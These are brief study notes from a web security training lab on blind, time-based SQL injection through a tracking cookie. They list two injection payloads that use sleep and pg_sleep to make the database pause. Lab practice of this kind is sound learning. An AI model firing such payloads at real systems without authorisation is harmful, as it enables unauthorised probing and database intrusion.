Lab #31 - Blind SL Injection with time delays

Vulnerablw parameter - tracking cookie

End Goal: 
- to prove that the field is vulnerable to blind SQLi(time based)

Analysis:

' || (SELECT sleep(10)) -x
' || (SELECT pg_sleep(10))--